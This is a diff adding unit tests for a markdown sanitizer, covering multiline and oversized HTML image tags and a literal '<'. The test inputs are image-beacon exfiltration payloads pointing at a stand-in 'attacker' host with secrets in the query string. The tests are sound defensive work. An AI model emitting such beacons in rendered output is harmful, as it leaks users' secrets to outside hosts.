@@ -7,6 +7,28 @@ def test_raw_html_stripped():
     assert "</script>" not in out
 
 
+def test_multiline_html_tag_stripped():
+    # A tag whose attributes span newlines is a zero-click image beacon that a
+    # single-line tag pattern lets through.
+    out = sanitize_markdown('before <img\nsrc="http://attacker/?c=secret"> after')
+    assert "attacker" not in out
+    assert "<img" not in out
+    assert "before  after" == out
+
+
+def test_oversized_html_tag_stripped():
+    tag = "<img " + "x" * 5000 + ' src="http://attacker/?c=1">'
+    out = sanitize_markdown("a" + tag + "b")
+    assert "attacker" not in out
+    assert "<img" not in out
+    assert out == "ab"
+
+
+def test_unterminated_angle_bracket_kept():
+    # A lone '<' with no closing '>' is literal text, not a tag.
+    assert sanitize_markdown("2 < 3 and 4") == "2 < 3 and 4"
+
+
 def test_image_url_defanged():
     out = sanitize_markdown("![leak](http://attacker.example/?secret=abc)")
     assert "attacker.example" not in out
